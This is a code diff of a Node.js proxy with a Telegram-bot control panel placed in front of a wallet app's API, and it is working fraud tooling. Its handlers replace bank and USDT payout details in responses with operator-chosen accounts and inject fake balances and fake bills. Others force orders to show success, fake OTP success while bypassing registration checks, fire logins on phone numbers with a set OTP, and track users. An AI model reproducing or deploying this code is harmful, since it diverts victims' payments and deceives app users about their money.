+      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
+      if (!freshData.balanceHistory) freshData.balanceHistory = [];
+      const now = new Date();
+      const ts = now.getTime();
+      const orderNo = 'BP' + String(ts) + String(Math.floor(Math.random() * 9000000) + 1000000);
+      const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      freshData.balanceHistory.push({ type: 'add', userId: targetUserId, amount, totalAdded: freshData.userOverrides[targetUserId].addedBalance, time: timeStr });
+      if (!freshData.fakeBills) freshData.fakeBills = {};
+      if (!freshData.fakeBills[targetUserId]) freshData.fakeBills[targetUserId] = [];
+      freshData.fakeBills[targetUserId].push({ amount, orderNo, createTime: timeStr, timestamp: ts });
+      freshData._skipOverrideMerge = true;
+      await saveData(freshData);
+      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}`);
+      return res.sendStatus(200);
+    }
 
-      try {
-        const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
-          method: 'POST',
-          headers: hdrs,
-          body: formBody
-        });
-        const statusCode = resp.status;
-        const respText = await resp.text();
-        let result;
-        try { result = JSON.parse(respText); } catch(e) { result = respText; }
-        await bot.sendMessage(chatId, `🧪 Test OTP: ${otp}\nHTTP Status: ${statusCode}\nBody sent: ${formBody}\nHeaders used: ${savedForgetPassHeaders ? 'saved auth' : 'minimal'}\n\nResponse:\n${JSON.stringify(result, null, 2).substring(0, 2000)}`);
-      } catch(e) {
-        await bot.sendMessage(chatId, `⚠️ Error: ${e.message}`);
+    // /deduct
+    if (text.startsWith('/deduct ')) {
+      const parts = text.substring(8).trim().split(/\s+/);
+      const amount = parseFloat(parts[0]);
+      const targetUserId = parts[1] || '';
+      if (isNaN(amount) || !targetUserId) {
+        await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>');
+        return res.sendStatus(200);
+      }
+      const freshData = await loadData(true);
+      if (!freshData.userOverrides) freshData.userOverrides = {};
+      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
+      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) - amount;
+      if (!freshData.balanceHistory) freshData.balanceHistory = [];
+      freshData.balanceHistory.push({ type: 'deduct', userId: targetUserId, amount, totalAdded: freshData.userOverrides[targetUserId].addedBalance, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
+      freshData._skipOverrideMerge = true;
+      await saveData(freshData);
+      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Net change: ₹${freshData.userOverrides[targetUserId].addedBalance}`);
+      return res.sendStatus(200);
+    }
+
+    // /remove balance
+    if (text.startsWith('/remove balance ')) {
+      const targetUserId = text.substring(16).trim();
+      const freshData = await loadData(true);
+      if (freshData.userOverrides && freshData.userOverrides[targetUserId]) {
+        delete freshData.userOverrides[targetUserId].addedBalance;
+        freshData._skipOverrideMerge = true;
+        await saveData(freshData);
+      }
+      if (freshData.fakeBills && freshData.fakeBills[targetUserId]) {
+        delete freshData.fakeBills[targetUserId];
+        freshData._skipOverrideMerge = true;
+        await saveData(freshData);
+      }
+      await bot.sendMessage(chatId, `✅ Balance removed for user ${targetUserId}`);
+      return res.sendStatus(200);
+    }
+
+    // /success
+    if (text.startsWith('/success ')) {
+      const targetUserId = text.substring(9).trim();
+      data = await loadData(true);
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
+      data.userOverrides[targetUserId].forceReviewSuccess = true;
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `✅ User ${targetUserId} ke REVIEW orders SUCCESS dikhenge`);
+      return res.sendStatus(200);
+    }
+
+    // /unsuccess
+    if (text.startsWith('/unsuccess ')) {
+      const targetUserId = text.substring(11).trim();
+      data = await loadData(true);
+      if (data.userOverrides && data.userOverrides[targetUserId]) {
+        delete data.userOverrides[targetUserId].forceReviewSuccess;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+      }
+      await bot.sendMessage(chatId, `✅ User ${targetUserId} real status dikhega`);
+      return res.sendStatus(200);
+    }
+
+    // /history
+    if (text === '/history' || text.startsWith('/history ')) {
+      data = await loadData(true);
+      const targetId = text.startsWith('/history ') ? text.substring(9).trim() : null;
+      const hist = (data.balanceHistory || []).filter(h => !targetId || h.userId === targetId).slice(-30);
+      if (!hist.length) { await bot.sendMessage(chatId, '📋 No history'); return res.sendStatus(200); }
+      const lines = hist.map(h => `${h.type === 'add' ? '➕' : '➖'} ₹${h.amount} → User ${h.userId} | Net: ₹${h.totalAdded} | ${h.time}`);
+      await bot.sendMessage(chatId, lines.join('\n').substring(0, 3500));
+      return res.sendStatus(200);
+    }
+
+    // /clearhistory
+    if (text === '/clearhistory') {
+      data = await loadData(true);
+      data.balanceHistory = [];
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, '✅ History cleared');
+      return res.sendStatus(200);
+    }
+
+    // /usdt
+    if (text === '/usdt off') {
+      data = await loadData(true); data.usdtAddress = ''; data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, '✅ USDT override disabled'); return res.sendStatus(200);
+    }
+    if (text.startsWith('/usdt ')) {
+      const addr = text.substring(6).trim();
+      data = await loadData(true); data.usdtAddress = addr; data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, `✅ USDT address set: ${addr}`); return res.sendStatus(200);
+    }
+
+    // /active
+    if (text === '/active' || text === '/active list' || text.startsWith('/active ')) {
+      data = await loadData(true);
+      if (!Array.isArray(data.activePhones)) data.activePhones = [];
+      if (text === '/active' || text === '/active list') {
+        const list = data.activePhones;
+        await bot.sendMessage(chatId, list.length ? `🔄 Active Logins: ${list.length}\n${list.map((p, i) => `${i + 1}. ${p}`).join('\n')}` : '🔄 Active Logins: 0\nUse /active <phone>');
+        return res.sendStatus(200);
+      }
+      if (text.startsWith('/active off ')) {
+        const ph = text.substring(12).trim().replace(/\D/g, '');
+        if (!ph) { await bot.sendMessage(chatId, '❌ Format: /active off <phone>'); return res.sendStatus(200); }
+        data.activePhones = data.activePhones.filter(p => String(p) !== ph);
+        data._skipOverrideMerge = true; await saveData(data);
+        await bot.sendMessage(chatId, `🛑 ${ph} active list se hata diya`);
+        return res.sendStatus(200);
+      }
+      const ph = text.substring(8).trim().replace(/\D/g, '');
+      if (!ph || ph.length < 8) { await bot.sendMessage(chatId, '❌ Valid phone number do'); return res.sendStatus(200); }
+      if (!data.activePhones.includes(ph)) data.activePhones.push(ph);
+      data._skipOverrideMerge = true; await saveData(data);
+      const otpUsed = getActiveOtp(data);
+      const result = await fireActiveLogin(ph, otpUsed);
+      if (result.ok) {
+        await bot.sendMessage(chatId, `✅ ${ph} ACTIVE\n👤 UserID: ${result.userId || 'N/A'}\nOTP: ${otpUsed}\n🛑 Stop: /active off ${ph}`);
+      } else {
+        await bot.sendMessage(chatId, `⚠️ ${ph} added to list, first login failed:\n${result.error}`);
       }
       return res.sendStatus(200);
     }
 
-    else if (text.startsWith('/addbank ')) {
-      const parts = text.substring(9).split('|').map(s => s.trim());
-      if (parts.length !== 3) {
-        await bot.sendMessage(chatId, '❌ Format: /addbank AccNo | Name | IFSC');
+    // /otp
+    if (text === '/otp' || text.startsWith('/otp ')) {
+      data = await loadData(true);
+      if (text === '/otp') {
+        await bot.sendMessage(chatId, `🔑 Current OTP: ${getActiveOtp(data)}\nChange: /otp <code>`);
         return res.sendStatus(200);
       }
-      if (bankData.banks.length >= 10) {
-        await bot.sendMessage(chatId, '❌ Max 10 banks.');
-        return res.sendStatus(200);
+      const newOtp = text.substring(5).trim();
+      if (!/^\d{4,8}$/.test(newOtp)) { await bot.sendMessage(chatId, '❌ OTP must be 4-8 digits'); return res.sendStatus(200); }
+      data.activeOtp = newOtp; data._skipOverrideMerge = true; await saveData(data);
+      _activeMonitorOtp = newOtp; _activeMonitorLastRefresh = 0;
+      const phones = Array.isArray(data.activePhones) ? data.activePhones : [];
+      if (!phones.length) { await bot.sendMessage(chatId, `🔑 OTP set: ${newOtp}`); return res.sendStatus(200); }
+      const results = await Promise.all(phones.map(async ph => ({ ph, r: await fireActiveLogin(ph, newOtp) })));
+      const okList = results.filter(x => x.r.ok).map(x => `✅ ${x.ph}`);
+      const failList = results.filter(x => !x.r.ok).map(x => `❌ ${x.ph}: ${x.r.error}`);
+      await bot.sendMessage(chatId, `🔑 OTP: ${newOtp}\n✅ ${okList.length} ok, ❌ ${failList.length} fail\n${[...okList, ...failList].join('\n')}`.substring(0, 3500));
+      return res.sendStatus(200);
+    }
+
+    // /idtrack
+    if (text === '/idtrack') {
+      data = await loadData(true);
+      const tracked = data.trackedUsers || {};
+      const keys = Object.keys(tracked);
+      if (!keys.length) { await bot.sendMessage(chatId, 'No tracked users'); return res.sendStatus(200); }
+      const lines = keys.slice(-30).map(uid => {
+        const t = tracked[uid];
+        return `👤 ${uid}${t.phone ? ' (' + t.phone + ')' : ''}\n  Last: ${t.lastSeen}\n  Action: ${t.lastAction}`;
+      });
+      await bot.sendMessage(chatId, lines.join('\n\n').substring(0, 3500));
+      return res.sendStatus(200);
+    }
+
+    // /off log
+    if (text.startsWith('/off log ')) {
+      const targetId = text.substring(9).trim();
+      data = await loadData(true);
+      if (!data.userOverrides) data.userOverrides = {};
+      if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
+      data.userOverrides[targetId].logOff = true;
+      data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, `🔇 Logging OFF for ${targetId}`);
+      return res.sendStatus(200);
+    }
+
+    // /on log
+    if (text.startsWith('/on log ')) {
+      const targetId = text.substring(8).trim();
+      data = await loadData(true);
+      if (data.userOverrides && data.userOverrides[targetId]) {
+        delete data.userOverrides[targetId].logOff;
+        data._skipOverrideMerge = true; await saveData(data);
       }
-      bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
-      if (bankData.banks.length === 1) bankData.activeIndex = 0;
-      await saveData(bankData);
-      await bot.sendMessage(chatId,
-`✅ Bank #${bankData.banks.length} added:
-${parts[0]} | ${parts[1]} | ${parts[2]}
-${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
-      );
+      await bot.sendMessage(chatId, `📡 Logging ON for ${targetId}`);
+      return res.sendStatus(200);
     }
 
-    else if (text.startsWith('/removebank ')) {
-      const num = parseInt(text.substring(12).trim());
-      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
-        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
-        return res.sendStatus(200);
-      }
-      const removed = bankData.banks.splice(num - 1, 1)[0];
-      if (bankData.activeIndex === num - 1) bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
-      else if (bankData.activeIndex > num - 1) bankData.activeIndex--;
-      if (bankData.userOverrides) {
-        for (const uid of Object.keys(bankData.userOverrides)) {
-          const uo = bankData.userOverrides[uid];
-          if (uo.bankIndex !== undefined) {
-            if (uo.bankIndex === num - 1) delete uo.bankIndex;
-            else if (uo.bankIndex > num - 1) uo.bankIndex--;
-          }
-        }
-      }
-      await saveData(bankData);
-      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
-    }
-
-    else if (text.startsWith('/usebank ')) {
-      const num = parseInt(text.substring(9).trim());
-      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
-        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
-        return res.sendStatus(200);
-      }
-      bankData.activeIndex = num - 1;
-      await saveData(bankData);
-      const bank = bankData.banks[bankData.activeIndex];
-      await bot.sendMessage(chatId,
-`✅ Bank #${num} ACTIVE (global):
-${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
-      );
-    }
-
-    else if (text === '/deactivate') {
-      bankData.activeIndex = -1;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, '🔴 All banks deactivated (global).');
-    }
-
-    else if (text === '/on') {
-      bankData.botEnabled = true;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, '🟢 Bot ON (global)! Bank overlay + notifications active.');
-    }
-
-    else if (text === '/off') {
-      bankData.botEnabled = false;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, '🔴 Bot OFF (global)! No overlay, no notifications.');
-    }
-
-    else if (text === '/rotate on') {
-      if (bankData.banks.length < 2) {
-        await bot.sendMessage(chatId, '❌ Add at least 2 banks for auto-rotate.');
-        return res.sendStatus(200);
-      }
-      bankData.autoRotate = true;
-      bankData.lastUsedIndex = -1;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, `🔄 Auto-Rotate ON!\n${bankData.banks.length} banks in rotation.`);
-    }
-
-    else if (text === '/rotate off') {
-      bankData.autoRotate = false;
-      await saveData(bankData);
-      const active = getActiveBank(bankData, null);
-      await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
-    }
-
-    else if (text.startsWith('/deposit on')) {
-      const amountStr = text.substring(11).trim();
-      const amount = parseFloat(amountStr);
-      if (amountStr && isNaN(amount)) {
-        await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>\nFor per-ID: /id deposit on <amount> <userId>');
-        return res.sendStatus(200);
-      }
-      bankData.depositSuccess = true;
-      if (!isNaN(amount) && amount > 0) {
-        bankData.depositBonus = (bankData.depositBonus || 0) + amount;
-      }
-      await saveData(bankData);
-      await bot.sendMessage(chatId,
-`✅ Deposit SUCCESS mode ON (GLOBAL — all users)!
-
-${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${bankData.depositBonus || 0}
-
-For per-ID control: /id deposit on <amount> <userId>`
-      );
-    }
-
-    else if (text === '/deposit off') {
-      bankData.depositSuccess = false;
-      bankData.depositBonus = 0;
-      await saveData(bankData);
-      await bot.sendMessage(chatId, '🔴 Deposit OFF (GLOBAL)! Real data restored.\nPer-ID overrides still active. Use /id list to check.');
-    }
-
-    else if (text === '/list') {
-      const rotateStatus = bankData.autoRotate ? '🔄 Auto-Rotate: ON' : '🔄 Auto-Rotate: OFF';
-      const botStatus = bankData.botEnabled !== false ? '🟢 Bot: ON' : '🔴 Bot: OFF';
-      const depositStatus = bankData.depositSuccess ? '✅ Deposit: SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Deposit: Normal';
-      const idCount = Object.keys(bankData.userOverrides || {}).length;
-      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus} (global)\n${rotateStatus}\n${depositStatus} (global)\n👤 Per-ID overrides: ${idCount}\n\nUse /id list for per-ID details`);
-    }
-
-    else if (text === '/status') {
-      const botOn = bankData.botEnabled !== false;
-      const rotate = bankData.autoRotate === true;
-      const deposit = bankData.depositSuccess === true;
-      const active = getActiveBank(bankData, null);
-      const idCount = Object.keys(bankData.userOverrides || {}).length;
-      let msg = `📊 Global Status:\n\n`;
-      msg += `Bot: ${botOn ? '🟢 ON' : '🔴 OFF'}\n`;
-      msg += `Auto-Rotate: ${rotate ? '🔄 ON (' + bankData.banks.length + ' banks)' : '❌ OFF'}\n`;
-      msg += `Deposit: ${deposit ? '✅ SUCCESS (₹' + (bankData.depositBonus || 0) + ')' : '🔴 Normal'}\n`;
-      msg += `Banks: ${bankData.banks.length}\n`;
-      msg += `Per-ID overrides: ${idCount}\n`;
-      if (bankData.withdrawOverride > 0) {
-        msg += `Withdraw Override: ON global (first ${bankData.withdrawOverride} order(s) → Paying)\n`;
-      }
-      const wUsers = Object.entries(bankData.userOverrides || {}).filter(([k, v]) => v.withdrawCount > 0);
-      if (wUsers.length > 0) {
-        msg += `Withdraw per-ID:\n`;
-        wUsers.forEach(([uid, v]) => { msg += `  👤 ${uid}: first ${v.withdrawCount} order(s) → Paying\n`; });
-      }
-      msg += `USDT Override: ${bankData.usdtAddress ? '✅ ' + bankData.usdtAddress.substring(0, 10) + '...' : '❌ OFF'}\n`;
-      msg += `Request Logging: ${bankData.logRequests ? '📡 ON' : '🔇 OFF'}\n`;
-      if (active) {
-        msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
-      } else {
-        msg += `\n⚠️ No active bank`;
-      }
-      await bot.sendMessage(chatId, msg);
-    }
-
-    return res.sendStatus(200);
-  } catch (err) {
-    console.error('Telegram error:', err);
-    return res.sendStatus(200);
-  }
-});
-
-app.post('/wallet/sendOtp', async (req, res) => {
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    if (jsonResp && jsonResp.statusCode === '0') {
-      sendJson(res, respHeaders, jsonResp, respBody);
-      return;
-    }
-    const info = (jsonResp && jsonResp.statusInfo || '').toUpperCase();
-    if (!(info.includes('EXIST') || info.includes('ALREADY') || info.includes('REGISTERED'))) {
-      sendJson(res, respHeaders, jsonResp, respBody);
-      return;
-    }
-    const body = req.parsedBody || {};
-    const origPhone = body.phone || body.mobile || body.phoneNumber || '';
-    const contentType = (req.headers['content-type'] || '').toLowerCase();
-    const phoneVariants = [];
-    const stripped = origPhone.replace(/^\+?91/, '').replace(/^0+/, '');
-    if (origPhone !== '91' + stripped) phoneVariants.push('91' + stripped);
-    if (origPhone !== '+91' + stripped) phoneVariants.push('+91' + stripped);
-    if (origPhone !== '0' + stripped) phoneVariants.push('0' + stripped);
-    if (origPhone !== stripped) phoneVariants.push(stripped);
-    if (origPhone !== ' ' + stripped) phoneVariants.push(' ' + stripped);
-
-    let success = false;
-    let successResp = null;
-    let successHeaders = null;
-    let usedPhone = '';
-
-    for (const altPhone of phoneVariants) {
-      try {
-        let newBody;
-        const phoneKey = body.phone ? 'phone' : body.mobile ? 'mobile' : 'phoneNumber';
-        if (contentType.includes('json')) {
-          const newObj = { ...body, [phoneKey]: altPhone };
-          newBody = JSON.stringify(newObj);
-        } else {
-          const params = new URLSearchParams(req.rawBody.toString());
-          params.set(phoneKey, altPhone);
-          newBody = params.toString();
-        }
-        const forwardHeaders = {};
-        for (const [key, val] of Object.entries(req.headers)) {
-          const k = key.toLowerCase();
-          if (k === 'host' || k === 'connection' || k === 'content-length' ||
-              k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
-          forwardHeaders[key] = val;
-        }
-        forwardHeaders['host'] = 'api.i-money.vip';
-        forwardHeaders['content-length'] = String(Buffer.byteLength(newBody));
-        const altResp = await fetch(ORIGINAL_API + '/wallet/sendOtp', {
-          method: 'POST', headers: forwardHeaders, body: newBody
-        });
-        const altBody = await altResp.text();
-        let altJson = null;
-        try { altJson = JSON.parse(altBody); } catch(e) {}
-        if (altJson && altJson.statusCode === '0') {
-          success = true;
-          successResp = altJson;
-          usedPhone = altPhone;
-          const rh = {};
-          altResp.headers.forEach((v, k) => {
-            if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') rh[k] = v;
-          });
-          successHeaders = rh;
-          break;
-        }
-      } catch(e) {}
-    }
-
-    if (success) {
-      if (bot && (await loadData()).adminChatId) {
-        bot.sendMessage((await loadData()).adminChatId, `✅ Wallet OTP bypass worked!\nOriginal: ${origPhone}\nUsed: ${usedPhone}\n⚠️ Use same format in wallet/add`).catch(()=>{});
-      }
-      sendJson(res, successHeaders, successResp, JSON.stringify(successResp));
-    } else {
-      jsonResp.statusCode = '0';
-      jsonResp.statusInfo = 'SUCCESS';
-      jsonResp.status = 200;
-      if (bot && (await loadData()).adminChatId) {
-        bot.sendMessage((await loadData()).adminChatId, `⚠️ All phone variants failed for ${origPhone}\nNo real OTP sent. Faked SUCCESS.`).catch(()=>{});
-      }
-      sendJson(res, respHeaders, jsonResp, respBody);
-    }
+    await bot.sendMessage(chatId, '❓ Unknown command. /start for help.');
+    res.sendStatus(200);
   } catch(e) {
-    await transparentProxy(req, res);
+    console.error('bot-webhook error:', e.message);
+    res.sendStatus(200);
   }
 });
 
-app.all('/wallet/online/walletType', async (req, res) => {
-  const bankData = await loadData();
-  const userId = extractUserId(req, null);
-  const eff = getEffectiveSettings(bankData, userId);
-  if (eff.botEnabled === false) return await transparentProxy(req, res);
-  const active = await getActiveBankAndSave(bankData, userId);
-  if (!active) return await transparentProxy(req, res);
+// ── Proxy handlers ────────────────────────────────────────────────
 
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-
-    if (jsonResp && jsonResp.data) {
-      const originalValues = {};
-      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
-      if (jsonResp.code === undefined) jsonResp.code = 1;
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
-    console.error('walletType proxy error:', e.message);
-    res.json({
-      code: 1,
-      data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' },
-      msg: 'success'
-    });
-  }
-});
-
-app.post('/money/uploadUtr', async (req, res) => {
-  const bankData = await loadData();
-  if (bankData.botEnabled === false) return await transparentProxy(req, res);
-  if (bankData.adminChatId && bot) {
-    let b = req.parsedBody || {};
-    const contentType = (req.headers['content-type'] || '').toLowerCase();
-    if (contentType.includes('multipart/form-data')) {
-      const bodyStr = req.rawBody.toString();
-      const utrMatch = bodyStr.match(/name="utr"[\r\n]+([^\r\n-]+)/);
-      const orderMatch = bodyStr.match(/name="orderId"[\r\n]+([^\r\n-]+)/);
-      const amountMatch = bodyStr.match(/name="utrAmount"[\r\n]+([^\r\n-]+)/);
-      if (utrMatch) b.utr = utrMatch[1].trim();
-      if (orderMatch) b.orderId = orderMatch[1].trim();
-      if (amountMatch) b.utrAmount = amountMatch[1].trim();
-    }
-    const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
-    if (!b.utr && qs.get('utr')) b.utr = qs.get('utr');
-    if (!b.orderId && qs.get('orderId')) b.orderId = qs.get('orderId');
-    if (!b.utrAmount && qs.get('utrAmount')) b.utrAmount = qs.get('utrAmount');
-
-    const userId = b.userId || qs.get('userId') || 'N/A';
-    bot.sendMessage(bankData.adminChatId,
-`💰 UTR Uploaded!
-👤 User: ${userId}
-Order: ${b.orderId || 'N/A'}
-UTR: ${b.utr || 'N/A'}
-Amount: ₹${b.utrAmount || 'N/A'}
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-    ).catch(() => {});
-    if (userId !== 'N/A') {
-      trackUser(bankData, userId, `UTR ${b.utr || ''}`);
-      saveData(bankData).catch(() => {});
-    }
-  }
-  await transparentProxy(req, res);
-});
-
-app.post('/money/cancelUtr', async (req, res) => {
-  const bankData = await loadData();
-  if (bankData.botEnabled === false) return await transparentProxy(req, res);
-  if (bankData.adminChatId && bot) {
-    bot.sendMessage(bankData.adminChatId,
-`❌ UTR Cancelled!
-Order: ${req.parsedBody?.orderId || 'N/A'}
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-    ).catch(() => {});
-  }
-  await transparentProxy(req, res);
-});
-
-async function proxyAndReplaceBankDetails(req, res, label) {
-  const bankData = await loadData();
-  const reqUserId = extractUserId(req, null);
-  const reqEff = getEffectiveSettings(bankData, reqUserId);
-  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
-
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-
-    const detectedUserId = extractUserId(req, jsonResp) || reqUserId;
-    const eff = getEffectiveSettings(bankData, detectedUserId);
-    const active = eff.botEnabled !== false ? await getActiveBankAndSave(bankData, detectedUserId) : null;
-
-    if (jsonResp && jsonResp.data && active) {
-      const originalValues = {};
-      deepReplaceBankDetails(jsonResp.data, active, originalValues, 0);
-    }
-
-    if (bankData.adminChatId && bot) {
-      const orderId = jsonResp?.data?.orderId || req.parsedBody?.orderId || 'N/A';
-      const amount = jsonResp?.data?.amountOrder || jsonResp?.data?.amount || req.parsedBody?.amount || 'N/A';
-      bot.sendMessage(bankData.adminChatId,
-`🔔 ${label}
-👤 User: ${detectedUserId || 'N/A'}
-Order: ${orderId}
-Amount: ₹${amount}
-Bank: ${active ? active.accountHolder : 'None'}
-Acc: ${active ? active.accountNo : 'N/A'}
-Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(() => {});
-    }
-
-    if (detectedUserId) {
-      const orderId = jsonResp?.data?.orderId || '';
-      trackUser(bankData, detectedUserId, `Order ${orderId}`);
-      saveData(bankData).catch(() => {});
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch (e) {
-    console.error('Proxy+replace error:', req.method, req.originalUrl, e.message);
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
-}
-
+// Balance / user info — add fake balance
 async function proxyAndAddBonus(req, res) {
-  const bankData = await loadData();
-
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-
-    const detectedUserId = extractUserId(req, jsonResp);
-    const eff = getEffectiveSettings(bankData, detectedUserId);
+    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    const userId = await extractUserId(req, jsonResp);
+    const eff = getEffectiveSettings(data, userId);
     const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
-
-    if (detectedUserId) {
-      saveTokenUserId(req, detectedUserId);
-      trackUser(bankData, detectedUserId, `App Open ${req.path}`);
-      saveData(bankData).catch(() => {});
+    if (userId) { trackUser(data, userId, 'App Open'); saveData(data).catch(()=>{}); }
+    const bonusData = getResponseData(jsonResp);
+    if (bonus > 0 && bonusData) addBonusToBalanceFields(bonusData, bonus);
+    if (userId && bonusData && typeof bonusData === 'object') {
+      const userOvr = data.userOverrides && data.userOverrides[String(userId)];
+      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
+      if (addedBal !== 0) addBonusToBalanceFields(bonusData, addedBal);
     }
-
-    if (bonus > 0 && jsonResp && jsonResp.data) {
-      addBonusToBalanceFields(jsonResp.data, bonus);
-    }
-
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
     sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
-    console.error('Balance proxy error:', e.message);
-    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
-  }
+  } catch(e) { await transparentProxy(req, res); }
 }
 
-async function proxyAndReplaceBankInList(req, res) {
-  const bankData = await loadData();
-
+// Order detail — bank replacement
+async function proxyAndReplaceBankDetails(req, res, label) {
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
+      loadData(),
+      proxyFetch(req)
+    ]);
+    const userId = await extractUserId(req, jsonResp);
+    const eff = getEffectiveSettings(data, userId);
+    const rd = getResponseData(jsonResp) || {};
+    const orderId = rd.orderId || rd.orderNo || rd.id || req.parsedBody?.orderId || req.query?.orderId || '';
+    const allOrderIds = [orderId, rd.inrOrderId, rd.payOrderId].filter(Boolean);
 
-    const detectedUserId = extractUserId(req, jsonResp);
-    if (detectedUserId) saveTokenUserId(req, detectedUserId);
-    const eff = getEffectiveSettings(bankData, detectedUserId);
-    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(bankData, detectedUserId) : null;
-
-    if (jsonResp && jsonResp.data) {
-      const applyToItem = (item) => {
-        const itemUserId = item.userId ? String(item.userId) : detectedUserId;
-        const itemEff = getEffectiveSettings(bankData, itemUserId);
-        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(bankData, itemUserId) : null;
-
-        if (itemActive) {
-          const origVals = {};
-          deepReplaceBankDetails(item, itemActive, origVals, 0);
-        }
-        if (itemEff.depositSuccess) markDepositSuccess(item);
-      };
-      if (Array.isArray(jsonResp.data)) {
-        jsonResp.data.forEach(applyToItem);
-      } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
-        jsonResp.data.list.forEach(applyToItem);
-      } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
-        jsonResp.data.records.forEach(applyToItem);
+    if (eff.botEnabled !== false && isProxyPending(data, allOrderIds) && !hasOrderBankDecision(data, orderId) && data.banks && data.banks.length > 0) {
+      const detectedAmount = parseFloat(rd.amount || rd.orderAmount || rd.payAmount || 0) || 0;
+      if (detectedAmount > 0) {
+        const lateActive = getActiveBank(data, userId, detectedAmount);
+        if (lateActive) await saveOrderBankMultipleKeys(data, allOrderIds, lateActive);
+        else await markOrderBankSkip(data, orderId);
       } else {
-        applyToItem(jsonResp.data);
-      }
-
-      const wCount = bankData.withdrawOverride || 0;
-      if (wCount > 0) {
-        let items = null;
-        if (Array.isArray(jsonResp.data)) items = jsonResp.data;
-        else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) items = jsonResp.data.list;
-        else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) items = jsonResp.data.records;
-
-        if (items && items.length > 0 && items[0].stat !== undefined) {
-          let changed = 0;
-          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
-            items[i].stat = 0;
-            changed++;
-          }
-        }
+        const fallbackActive = getActiveBank(data, userId);
+        if (fallbackActive) await saveOrderBankMultipleKeys(data, allOrderIds, fallbackActive);
       }
     }
+
+    if (eff.botEnabled !== false) {
+      const savedBank = getOrderBankMultiple(data, allOrderIds);
+      if (savedBank && rd) deepReplace(rd, savedBank, {}, 0);
+    }
+    if (eff.forceReviewSuccess && rd) markReviewAsSuccess(rd);
